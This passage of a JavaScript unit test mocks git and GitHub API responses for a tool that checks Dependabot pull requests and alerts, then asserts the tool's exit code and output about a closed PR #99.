      if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
      if (endpoint.includes('/pulls?state=open') || endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: '[]' };
      if (endpoint === 'repos/KStratMD/Preston-Test/pulls/99') return { status: 0, stdout: JSON.stringify({ number: 99, state: 'closed', user: { login: 'dependabot[bot]' }, base: { ref: 'Working-Branch', sha: authoritySha }, head: { sha: authoritySha }, labels: [] }) };
      throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
    },
  });

  assert.equal(result.exitCode, 2);
  assert.match(result.output, /#99/);
  assert.match(result.output, /Alerts: available/);
});
